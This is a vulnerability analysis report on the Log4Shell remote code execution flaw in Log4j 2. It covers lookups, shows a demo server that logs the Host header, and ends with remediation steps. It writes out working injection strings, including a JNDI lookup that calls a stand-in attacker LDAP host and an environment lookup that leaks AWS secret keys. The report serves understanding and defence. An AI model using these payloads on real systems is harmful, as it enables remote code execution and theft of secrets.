# Log4Shell RCE
### *Vulnerability Analysis Report*


## Introduction

Apache Log4j is a Java-based logging utility. It is one of the most famous logging frameworks for Java based applications and is incubated under Apache Foundation (as the name suggests). There are two major variants of the framework, namely, **Log4j** (version 1.x) and its successor **Log4j 2** (version 2.x).

On December 10th, 2021, LunaSec disclosed a severe vulnerability with 0-day exploit in the ubiquitous Java logging framework Log4j 2. The full report can be found at [LunaSec Log4j 0-day RCE exploit](https://www.lunasec.io/docs/blog/log4j-zero-day).


## Affected Versions

The vulnerability is related to a Log4j 2 feature called *Lookups*. *Lookups* are available only in **Log4j 2** (version 2.x) and not in **Log4j** (version 1.x).

For more information on *Lookups* visit [Log4j 2 Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)

The vulnerability was patched in Log4j version 2.15.0. Therefore, all version prior to it starting from 2.0 and ending at 2.14.1 (inclusive) are vulnerable. Log4j 1.x is not affected by this vulnerability.

Vulnerable versions: ```2.0 <= Log4j <= 2.14.1```


## ```CVE-2021-44228```

This vulnerability is being tracked as CVE-2021-44228.

1. [MITRE Report](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)
2. [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
3. [Oracle Security Alert Advisory](https://www.oracle.com/security-alerts/alert-cve-2021-44228.html)


## Lookups in Log4j 2

Lookups provide a way to add values to the Log4j configuration at arbitrary places. They are a particular type of Plugin that implements the ```StrLookup``` interface. Information on how to use Lookups in configuration files can be found in the [Property Substitution](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution) section of the Configuration page.

There are many types of lookups. To know about all of them, visit [Log4j 2 Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html). Out of those, the ones that are interesting (and relevant to this vulnerability or other security related issues) are the following:

1. **Environment Lookup**: The EnvironmentLookup allows systems to configure environment variables, either in global files such as /etc/profile or in the startup scripts for applications, and then retrieve those variables from within the logging configuration.
2. **JNDI Lookup**:  The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with ```java:comp/env/```, however if the key contains a ```":"``` no prefix will be added. By default the JDNI Lookup only supports the java, ldap, and ldaps protocols or no protocol. Additional protocols may be supported by specifying them on the ```log4j2.allowedJndiProtocols``` property. When using LDAP Java classes that implement the ```Referenceable``` interface are not supported for security reasons. Only the Java primative classes are supported by default as well as any classes specified by the ```log4j2.allowedLdapClasses``` property. When using LDAP only references to the local host name or IP address are supported along with any hosts or IP addresses listed in the ```log4j2.allowedLdapHosts``` property.

### Configuration & Pattern Parsing

Lookups are mentioned in the configuration files / properties using meta-variables starting with double ```$```. During initial configuration parsing the first ```$``` will be removed. The PatternLayout supports interpolation with Lookups and will then resolve the variable for each event. Note that the pattern ```%X{loginId}``` would achieve the same result.

In the following example, the ```$${lower:{${spring:spring.application.name}}``` indicates the configuration parser about the presence of a meta-variable.
```xml
<File name="Application" fileName="application.log">
    <PatternLayout>
        <pattern>%d %p %c{1.} [%t] $${lower:{${spring:spring.application.name}} %m%n</pattern>
    </PatternLayout>
</File>
```
The following steps would happen for the above lookup to take effect:
* Step 1: Configuration parser recognizes and parses the meta-variable ```$${lower:{${spring:spring.application.name}}``` to ```${lower:{${spring:spring.application.name}}``` (Removed the initial ```$```). So the resulting message pattern (after configuration parsing) would contain the meta-variable pattern starting with a single ```$```.
* Step 2: While logging an event (when ```fatal | error | debug | info | warn | trace``` etc. methods are called), the values required for resolving all lookups are gathered in a context, the message ```... ${lower:{${spring:spring.application.name}} ...``` (containing meta-variable patterns for lookup starting with single ```$```) is sent to the PatternLayout parser along with that context.
* Step 3: The PatternLayout parser parses and substitutes the context values in the appropriate places inside the message, according to the supplied pattern. This happens everytime an event is logged.

The above statements mean that Log4j parses the pattern in a message for every individual logging event and substitutes the values present in the context. Therefore, if a message contains a pattern which look like  ```${...}```, the logger pattern parser would consider it as a lookup meta-variable.


### Example

Suppose there is an HTTP server that logs the *Host* header value for every request it receives. It might log the value into any Log4j appender (say a log file or console).

For example:

```java
import io.vertx.core.AbstractVerticle;
import io.vertx.core.Promise;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class MainVerticle extends AbstractVerticle {
    private static final Logger logger = LogManager.getLogger(MainVerticle.class);

    @Override
    public void start(Promise<Void> startPromise) {
        vertx.createHttpServer().requestHandler(request -> {

            // This is where the server logs the Host header value
            logger.info("Received request with host: {}", request.host());

            request.response().putHeader("content-type", "text/plain").end("Hello World!");
        }).listen(8888, http -> {
            if (http.succeeded()) {
                logger.info("HTTP server started on port 8888");
                startPromise.complete();
            } else {
                logger.error("HTTP server started on port 8888");
                startPromise.fail(http.cause());
            }
        });
    }
}
```

For normal HTTP requests (like the following):


```text
GET /helloWorld HTTP/1.1
Host: pi.local:8888
Origin: https://pi.local:8888
```

with valid host header values, the log messages would look like:

```text
2021-12-12 11:48:11,797 INFO c.s.p.l.MainVerticle [vert.x-eventloop-thread-1] HTTP server started on port 8888
2021-12-12 11:48:11,799 INFO ? [vert.x-eventloop-thread-0] Succeeded in deploying verticle
2021-12-12 11:48:38,462 INFO c.s.p.l.MainVerticle [vert.x-eventloop-thread-1] Received request with host: pi.local:8888
```

However, if we send a request with *Host* header value ```${java:runtime}``` (like the following)

```text
GET /helloWorld HTTP/1.1
Host: ${java:runtime}
Origin: https://pi.local:8888
```

the log message changes to

```
2021-12-12 11:48:11,797 INFO c.s.p.l.MainVerticle [vert.x-eventloop-thread-1] HTTP server started on port 8888
2021-12-12 11:48:11,799 INFO ? [vert.x-eventloop-thread-0] Succeeded in deploying verticle
2021-12-12 11:48:38,462 INFO c.s.p.l.MainVerticle [vert.x-eventloop-thread-1] Received request with host: OpenJDK Runtime Environment (build 11.0.13+8) from Red Hat, Inc.
```

This shows that the pattern parser of Log4j parsed the message before logging and considered the pattern ```${java:runtime}``` as a lookup meta-variable of type Java lookup.

This finding lays the foundation to the vulnerability. The above case is true for any message logged with any value taken from outside. For example, if an application is logging usernames for all activities across it and an attacker keeps his / her username as ```${java:runtime}```, then that username will be substituted in the logs as shown above. This can lead to ***Log Forging***.


# The Vulnerability

## JNDI Injection (RCE)

JNDI injections are well known in Java. They're one of the most popular and severe vulnerabilities that can often lead to RCE with the attacker getting a full Shell access. Find more about it at [Exploiting JNDI Injections](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) by Michael Stepankin, a Security Researcher at Veracode.

Here are the points to note:
* Log4j 2 has implicit lookups that evaluates all valid patterns that looks like ```${...}```.
* It's very easy for an attacker to send a value resembling such a pattern. So much so that any values, as common as usernames, header values, device names, cookie contents, file names, exceptions, file contents etc. which are under attacker's control, can be sent with a valid lookup pattern leading to those variables being evaluated, resolved and logged.
* JNDI injection based RCE is a well known attack vector.
* Log4j has a JNDI lookup with pattern which looks like ```${jndi:<protocol>://...}```. It fetches and loads compiled Java classes from remote targets.

Basically, everything that is needed for an attacker to send a JNDI injection payload to remote endpoints are present. An attacker can craft a payload like ```${jndi:ldap://directory.attacker-controlled-domain.com/foo/bar}``` and inject it in practically anything that is being logged using Log4j on the server.

That above payload will visit the directory server running in the ```directory.attacker-controlled-domain.com``` host and query for ```/foo/bar``` directory. The directory server might return a directory name which can be a valid URL pointing to a compiled class file - Example: ```http://class.attacker-controlled-domain.com/Exploit.class```. Then the Java lookup in Log4j will try to fetch that compiled class and load it in the JVM runtime. The any static code blocks will be executed instantly when the class is loaded and therefore might allow an attacker to create a bind or reverse shell to the host server.


## Information Disclosure

Information disclosure can happen because of **Environment Lookup**.

It is a common practice to specify secrets, passwords, passphrases and access keys using environment variables. For example, Dockerized applications can take in the access and secret keys to AWS environment using environment variables mentioned in the Dockerfile.

Environment Lookup dumps environment variables in logs. For example ```${env:USER}``` will print the current ```$USER``` value in logs. Similarly ```${env:SESSION_MANAGER}``` and ```${env:AWS_SECRET_ACCESS_KEY}``` will dump ```$SESSION_MANAGER``` and ```$AWS_SECRET_ACCESS_KEY``` environment variables.

This will disclose secrets to anyone having access to logs as they might contain sensitive information in plaintext. If the logger is used with an appender that discloses information back to the attacker, then the attacker can openly read the values of all environment variables.


# Remediation

**Recommended**: Upgrade Log4j to a version ```2.15.0``` or above.

If not possible, the following workarounds will also mitigate:
* Modify every logging pattern to say ```%m{nolookups}``` instead of ```%m``` in logging config files, see details at [Log4j JIRA](https://issues.apache.org/jira/browse/LOG4J2-2109) (only works on versions >= 2.7). Make sure to introduce explicit pattern for all appenders as default pattern won't have this mitigation.
* Substitute a non-vulnerable or no-operation implementation of the class ```org.apache.logging.log4j.core.lookup.JndiLookup```, in a way that the classloader uses this replacement instead of the vulnerable version of the class.
* In Log4j versions >= 2.10, it's possible to mitigate this issue by setting JVM system property ```-Dlog4j2.formatMsgNoLookups=true``` or the environment variable ```LOG4J_FORMAT_MSG_NO_LOOKUPS``` to true
